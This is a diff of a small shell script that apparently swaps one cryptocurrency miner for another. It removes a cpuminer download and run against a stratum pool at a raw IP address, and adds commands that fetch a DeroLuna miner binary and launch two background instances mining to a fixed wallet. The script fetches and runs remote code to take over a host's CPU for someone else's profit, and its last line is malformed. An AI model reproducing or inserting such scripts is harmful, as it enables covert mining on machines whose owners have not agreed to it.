@@ -4,7 +4,9 @@
 # kumaha aink we njink
 
 cd /home
-wget https://raw.githubusercontent.com/TheJackalTrib/gasken/master/cpuminer
-chmod +x cpuminer
-./cpuminer -a minotaurx -o stratum+tcp://43.228.215.76:8080 -u DBvi4ZFPxxVB1ivfNffHHP8kSWABVc2MQK -p c=DGB,zap=BUT-lyra2z330 -t $(nproc --ignore 1)
-rm -irf cpuminer
+wget https://github.com/DeroLuna/dero-miner/releases/download/v1.13-beta/deroluna-miner-linux-amd64.tar.gz
+tar -xf deroluna-miner-linux-amd64.tar.gz
+chmod +x deroluna-miner
+./deroluna-miner -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xetjpjsjdntaq3s5rx3my -d dero-node.mysrv.cloud:443 &
+./deroluna-miner -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xetjpjsjdntaq3s5rx3my -d dero-node.mysrv.cloud:443 &
+timeout 244 h
